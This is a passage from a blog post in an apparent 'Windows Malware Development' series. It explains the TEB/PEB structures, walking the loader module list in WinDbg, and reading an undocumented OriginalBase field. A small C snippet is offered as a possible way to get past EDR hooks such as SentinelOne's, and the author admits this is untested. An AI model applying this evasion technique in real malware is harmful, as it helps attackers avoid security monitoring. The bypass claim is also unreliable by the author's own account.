</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">HeapFlsData</span><span class="p">;</span>                                                      <span class="c1">//0x258
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONGLONG</span> <span class="n">RngState</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>                                                  <span class="c1">//0x260
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">CHAR</span> <span class="n">PlaceholderCompatibilityMode</span><span class="p">;</span>                                      <span class="c1">//0x280
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">UCHAR</span> <span class="n">PlaceholderHydrationAlwaysExplicit</span><span class="p">;</span>                               <span class="c1">//0x281
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">CHAR</span> <span class="n">PlaceholderReserved</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>                                           <span class="c1">//0x282
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">ProxiedProcessId</span><span class="p">;</span>                                                 <span class="c1">//0x28c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">............</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div><p>If you want to get the base address of the TEB, you have to do it in a roundabout way. Specifically, the first member of the TEB is a Thread Information Block (TIB) struct. This struct contains information about the current thread as shown below:</p>

<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_NT_TIB64</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">ExceptionList</span><span class="p">;</span>                                                <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONGLONG</span> <span class="n">StackBase</span><span class="p">;</span>                                                    <span class="c1">//0x8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONGLONG</span> <span class="n">StackLimit</span><span class="p">;</span>                                                   <span class="c1">//0x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONGLONG</span> <span class="n">SubSystemTib</span><span class="p">;</span>                                                 <span class="c1">//0x18
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONGLONG</span> <span class="n">FiberData</span><span class="p">;</span>                                                <span class="c1">//0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>                                                      <span class="c1">//0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">ArbitraryUserPointer</span><span class="p">;</span>                                         <span class="c1">//0x28
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONGLONG</span> <span class="n">Self</span><span class="p">;</span>                                                         <span class="c1">//0x30
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span> 
</span></span></code></pre></div><p>The <code>Self</code> member holds a pointer to the base address of the TEB itself. This means that within the first member of the TEB and last member within that, we can grab the base address of the TEB struct. The offset from the beginning of the TEB to the last member of the TIB is <code>0x30</code>. Referencing <code>gs:[0x30]</code> in assembly will grab the base address in which the TEB is located. A simple call to <code>__readgsqword(0x30)</code> in C will do just that and get the base address to the TEB. However to get the PEB because it&rsquo;s at an offset of <code>0x60</code>, means adjusting the call to <code>__readgsqword(0x60)</code>.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
<path fill="currentColor" d="M320 32c-8.1 0-16.1 1.4-23.7 4.1L15.8 137.4C6.3 140.9 0 149.9 0 160s6.3 19.1 15.8 22.6l57.9 20.9C57.3 229.3 48 259.8 48 291.9v28.1c0 28.4-10.8 57.7-22.3 80.8c-6.5 13-13.9 25.8-22.5 37.6C0 442.7-.9 448.3 .9 453.4s6 8.9 11.2 10.2l64 16c4.2 1.1 8.7 .3 12.4-2s6.3-6.1 7.1-10.4c8.6-42.8 4.3-81.2-2.1-108.7C90.3 344.3 86 329.8 80 316.5V291.9c0-30.2 10.2-58.7 27.9-81.5c12.9-15.5 29.6-28 49.2-35.7l157-61.7c8.2-3.2 17.5 .8 20.7 9s-.8 17.5-9 20.7l-157 61.7c-12.4 4.9-23.3 12.4-32.2 21.6l159.6 57.6c7.6 2.7 15.6 4.1 23.7 4.1s16.1-1.4 23.7-4.1L624.2 182.6c9.5-3.4 15.8-12.5 15.8-22.6s-6.3-19.1-15.8-22.6L343.7 36.1C336.1 33.4 328.1 32 320 32zM128 408c0 35.3 86 72 192 72s192-36.7 192-72L496.7 262.6 354.5 314c-11.1 4-22.8 6-34.5 6s-23.5-2-34.5-6L143.3 262.6 128 408z"/></svg>
  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >The struct for the PEB contains a member of interest, which is <code>ldr</code>, and is of the type <code>PEB_LDR_DATA</code>. The <code>ldr</code> or &ldquo;loader&rdquo; is a struct that holds information pertinent to the DLLs required for the process. These structs can be found below:</span>
</div>


<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PEB</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved1</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">BeingDebugged</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved3</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB_LDR_DATA</span> <span class="n">Ldr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PRTL_USER_PROCESS_PARAMETERS</span> <span class="n">ProcessParameters</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved4</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">AtlThunkSListPtr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Reserved6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Reserved8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">AtlThunkSListPtr32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved9</span><span class="p">[</span><span class="mi">45</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved10</span><span class="p">[</span><span class="mi">96</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPS_POST_PROCESS_INIT_ROUTINE</span> <span class="n">PostProcessInitRoutine</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved11</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved12</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">SessionId</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">PEB</span><span class="p">,</span> <span class="o">*</span><span class="n">PPEB</span><span class="p">;</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PEB_LDR_DATA</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved1</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">LIST_ENTRY</span> <span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">PEB_LDR_DATA</span><span class="p">,</span> <span class="o">*</span><span class="n">PPEB_LDR_DATA</span><span class="p">;</span></span></span></code></pre></div><p>Within the <code>ldr</code> there is a doubly linked list called <code>InMemoryOrderModuleList</code>. This is of the type <code>LIST_ENTRY</code>. Because it is a doubly linked list the native construction for it contains only two members: <code>Flink</code> and <code>Blink</code>.  The former is a pointer to the next entry within the list, while the latter is a pointer to the previous entry. My assumption is they mean &ldquo;forwards link&rdquo; and &ldquo;backwards link&rdquo; respectively.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
<path fill="currentColor" d="M320 32c-8.1 0-16.1 1.4-23.7 4.1L15.8 137.4C6.3 140.9 0 149.9 0 160s6.3 19.1 15.8 22.6l57.9 20.9C57.3 229.3 48 259.8 48 291.9v28.1c0 28.4-10.8 57.7-22.3 80.8c-6.5 13-13.9 25.8-22.5 37.6C0 442.7-.9 448.3 .9 453.4s6 8.9 11.2 10.2l64 16c4.2 1.1 8.7 .3 12.4-2s6.3-6.1 7.1-10.4c8.6-42.8 4.3-81.2-2.1-108.7C90.3 344.3 86 329.8 80 316.5V291.9c0-30.2 10.2-58.7 27.9-81.5c12.9-15.5 29.6-28 49.2-35.7l157-61.7c8.2-3.2 17.5 .8 20.7 9s-.8 17.5-9 20.7l-157 61.7c-12.4 4.9-23.3 12.4-32.2 21.6l159.6 57.6c7.6 2.7 15.6 4.1 23.7 4.1s16.1-1.4 23.7-4.1L624.2 182.6c9.5-3.4 15.8-12.5 15.8-22.6s-6.3-19.1-15.8-22.6L343.7 36.1C336.1 33.4 328.1 32 320 32zM128 408c0 35.3 86 72 192 72s192-36.7 192-72L496.7 262.6 354.5 314c-11.1 4-22.8 6-34.5 6s-23.5-2-34.5-6L143.3 262.6 128 408z"/></svg>
  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >The <code>LIST_ENTRY</code> structure definition is held in the <code>ntdef.h</code> header file. This is the &ldquo;template&rdquo; for any doubly linked lists in Windows. However, the only capabilities it has are to go either forwards or backwards in the list. There is no information that can be stored so modifying the list is needed. This can be done by creating a new struct with the name being <code>NameOfStruct_ENTRY</code>. This will allow the modification to insert information in the list. Microsoft has done this for  <code>InMemoryOrderModuleList</code> and made the name <code>_LDR_DATA_TABLE_ENTRY</code>. The structs can be seen below:</span>
</div>


<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_LIST_ENTRY</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">struct</span> <span class="n">_LIST_ENTRY</span> <span class="o">*</span><span class="n">Flink</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">struct</span> <span class="n">_LIST_ENTRY</span> <span class="o">*</span><span class="n">Blink</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">LIST_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PLIST_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">RESTRICTED_POINTER</span> <span class="n">PRLIST_ENTRY</span><span class="p">;</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_LDR_DATA_TABLE_ENTRY</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved1</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">LIST_ENTRY</span> <span class="n">InMemoryOrderLinks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">DllBase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved3</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">UNICODE_STRING</span> <span class="n">FullDllName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved4</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved5</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cp">#pragma warning(push)
</span></span></span><span class="line"><span class="cl"><span class="cp">#pragma warning(disable: 4201) </span><span class="c1">// we&#39;ll always use the Microsoft compiler
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ULONG</span> <span class="n">CheckSum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">PVOID</span> <span class="n">Reserved6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">DUMMYUNIONNAME</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#pragma warning(pop)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">ULONG</span> <span class="n">TimeDateStamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">LDR_DATA_TABLE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">;</span></span></span></code></pre></div><p>The <code>InMemoryOrderModuleList</code> member is a doubly linked list of <code>LIST_ENTRY</code> structures which point to <code>LDR_DATA_TABLE_ENTRY</code> structs. These hold the information related to a specified DLL required for the process. For each required DLL, there is an <code>LDR_DATA_TABLE_ENTRY</code> structure for it.  The two members to note are the <code>DllBase</code> and <code>FullDLLName</code>. The former points to where the DLL for the process is located in memory and the latter is the name of the DLL. In order to get the base address of a specific DLL in this way, we would have to loop through the list and compare the name of the one we want to the name member. Once one is found, grab the <code>DllBase</code> member which would point to the base address.</p>
<p>However how some EDRs work (specifically SentinelOne (S1)) as of the date of this article), is that they modify the <code>DllBase</code> member of the DLLs they are monitoring and change it to their own. This is important because most hooks don&rsquo;t take place this deep within the process. There is an undocumented member of the <code>LDR_DATA_TABLE_ENTRY</code> struct which can bypass the hooked member and get the clean base address for the specified DLL. This member is called <code>OrgininalBase</code> and is at an offset of <code>0xf8</code>.</p>
<p>For example walking through the debugger with <code>WinDbg</code>, I can start with finding the PEB and, by extension, the <code>Ldr</code>:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/PEB_hu_73cb1200ea4cafb6.png 330w,
        /posts/windows-malware-development/developing-malware/img/PEB_hu_619aedc794a5bf9a.png 660w,
        /posts/windows-malware-development/developing-malware/img/PEB_hu_6abf99050685c1ea.png 1024w,
        /posts/windows-malware-development/developing-malware/img/PEB_hu_e5f22be1c953e000.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/PEB_hu_619aedc794a5bf9a.png"
        alt=""
      />
      
    </figure>
</p>
<p>Clicking into the <code>Ldr</code> shows the member I mentioned before which is <code>InMemoryOrderModuleList</code>:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/LDR_hu_b3fecd521eff2b16.png 330w,
        /posts/windows-malware-development/developing-malware/img/LDR_hu_d23adce2c14fe515.png 660w,
        /posts/windows-malware-development/developing-malware/img/LDR_hu_c776a25bbe3182a.png 1024w,
        /posts/windows-malware-development/developing-malware/img/LDR_hu_205cc1924c7b37ec.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/LDR_hu_d23adce2c14fe515.png"
        alt=""
      />
      
    </figure>
</p>
<p>Once more, clicking into the list will show the <code>LIST_ENTRY</code> struct which gives the <code>Flink</code> and <code>Blink</code> members. The addresses to the right of them are their pointers to the <code>LDR_DATA_TABLE_ENTRY</code> structs:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/List-Entry_hu_12046b6f6887e6d8.png 330w,
        /posts/windows-malware-development/developing-malware/img/List-Entry_hu_4c3dea49d70a14e.png 660w,
        /posts/windows-malware-development/developing-malware/img/List-Entry_hu_f98e4b54630edd09.png 1024w,
        /posts/windows-malware-development/developing-malware/img/List-Entry_hu_880a56326c5a3127.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/List-Entry_hu_4c3dea49d70a14e.png"
        alt=""
      />
      
    </figure>
</p>
<p>The first entry in the linked list is always describing the process. In this case that would be <code>notepad.exe</code> for the name of the module. To show that, take the address the <code>Flink</code> is pointing to and look at the <code>LDR_DATA_TABLE_ENTRY</code> for it:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-Notepad_hu_527ac19d1796c8b2.png 330w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-Notepad_hu_46dae03d8830e192.png 660w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-Notepad_hu_15f8e97aebf28017.png 1024w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-Notepad_hu_882a5f1d586bb4c3.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/Data-Table-Entry-Notepad_hu_46dae03d8830e192.png"
        alt=""
      />
      
    </figure>
</p>
<p>As seen in the <code>FullDllName</code> member, the first link in the list is <code>notepad.exe</code> which corresponds to the current process the PEB is describing. In order to get the DLLs, click the <code>Flink</code> again and it will move by one position in the list. The pointer will now point to the first DLL loaded within the process which usually is <code>ntdll.dll</code>:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/Flink_hu_c24d2bb1fa50a37a.png 330w,
        /posts/windows-malware-development/developing-malware/img/Flink_hu_242743cd96cbe97a.png 660w,
        /posts/windows-malware-development/developing-malware/img/Flink_hu_921e45d3d999da39.png 1024w,
        /posts/windows-malware-development/developing-malware/img/Flink_hu_6ab18b8de622e3ed.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/Flink_hu_242743cd96cbe97a.png"
        alt=""
      />
      
    </figure>
</p>
<p>Notice how the address changed. Take the address and show the <code>LDR_DATA_TABLE_ENTRY</code> for that:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-NTDLL_hu_c0ed01f03d6103cc.png 330w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-NTDLL_hu_2a28b3d6ce1d3be8.png 660w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-NTDLL_hu_c92fa0523e890fb9.png 1024w,
        /posts/windows-malware-development/developing-malware/img/Data-Table-Entry-NTDLL_hu_471f37d8b08636eb.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/Data-Table-Entry-NTDLL_hu_2a28b3d6ce1d3be8.png"
        alt=""
      />
      
    </figure>
</p>
<p>The <code>FullDllName</code> is now <code>ntdll.dll</code> which means we are in the entry for <code>ntdll</code>. As I mentioned, looking at the members, the <code>DllBase</code> shows the current base address for the DLL. At the bottom at offset <code>0x0f8</code>, the <code>OriginalBase</code> member appears as well. The values seem different at first but that is because <code>DllBase</code> is a pointer and <code>OriginalBase</code> is a static value.</p>
<p>Given that I don&rsquo;t have S1 to test, I was poking around with how this member works and it gave me the same address of the <code>DllBase</code> member. I don&rsquo;t have any way to prove or disprove this theory but testing shows, it could work. One thing to note is because it is undocumented, I had to call it by its offset instead of the member directly.</p>
<p>The PoC code snippet I used to calculate it is shown below for the <code>OriginalBase</code>, although the same code was conducted for the <code>DllBase</code>. Instead of <code>0xf8</code> offset, it is <code>0x30</code> which corresponds to <code>DllBase</code>:</p>

<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">LDR_DATA_TABLE_ENTRY</span><span class="o">*</span> <span class="n">mod</span> <span class="o">=</span> <span class="p">(</span><span class="n">LDR_DATA_TABLE_ENTRY</span><span class="o">*</span><span class="p">)</span><span class="nf">CONTAINING_RECORD</span><span class="p">(</span><span class="n">pDataTableEntry</span><span class="p">,</span> <span class="n">LDR_DATA_TABLE_ENTRY</span><span class="p">,</span> <span class="n">InMemoryOrderLinks</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0xf8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">UINT8</span><span class="o">*</span> <span class="n">pBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT8</span><span class="o">*</span><span class="p">)</span><span class="n">mod</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">UINT8</span><span class="o">*</span> <span class="n">calc</span> <span class="o">=</span> <span class="n">pBase</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">HMODULE</span> <span class="n">finalAddy</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">HMODULE</span><span class="o">*</span><span class="p">)</span><span class="n">calc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">finalAddy</span><span class="p">;</span></span></span></code></pre></div><p>The output of the addresses is as follows:</p>

<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-Text" data-lang="Text"><span class="line"><span class="cl">DllBase:      0x00007FF959AF0000
</span></span><span class="line"><span class="cl">OriginalBase: 0x00007FF959AF0000</span></span></code></pre></div><p>The fact they are the same means they are both pointing to a good, clean version of the DLL but from what I understand, the <code>OriginalBase</code> will always point to the &ldquo;original&rdquo; one whereas the <code>DllBase</code> can be manipulated by EDRs like S1. If I am wrong or there is a flaw in my research please let me know!</p>

          
          
          
        </div>
        
        

        
<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
    
    <summary
        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        Windows Malware Development - This article is part of a series. &nbsp &nbsp
    </summary>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="https://gridsec.net/posts/windows-malware-development/introduction/">
            Part 1: Introduction to Windows Architecture
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 2: This Article
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="https://gridsec.net/posts/windows-malware-development/debugging-and-mitigation/">
            Part 3: Debugging and Mitigation
        </a>
    </div>
    
    


</details>

        

          
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_Posts\\Windows Malware Development\\Developing Malware\\index.md"
        var oid_likes = "likes_Posts\\Windows Malware Development\\Developing Malware\\index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/windows-malware-development/introduction/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Introduction to Windows Architecture</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-05-03T00:00:00&#43;00:00">3 May, 2025</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/windows-malware-development/debugging-and-mitigation/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Debugging and Mitigation</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-05-05T00:00:00&#43;00:00">5 May, 2025</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      © 2025 Gr1dGh0st
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="https://gridsec.net/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
